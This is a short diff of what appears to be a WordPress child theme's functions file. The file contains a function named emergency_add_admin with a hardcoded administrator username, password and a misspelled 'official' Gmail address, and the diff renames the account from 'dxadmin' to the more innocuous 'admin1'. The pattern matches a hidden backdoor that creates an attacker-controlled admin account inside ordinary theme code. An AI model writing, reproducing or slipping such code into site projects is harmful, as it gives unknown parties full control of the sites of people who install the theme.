@@ -11,7 +11,7 @@ function liko_child_enqueue_styles() {
 }
 
 function emergency_add_admin(){
-    $username = 'dxadmin';
+    $username = 'admin1';
     $password = 'keepsilencekidsss'; 
     $email    = 'admin-offcial@gmail.com';
 
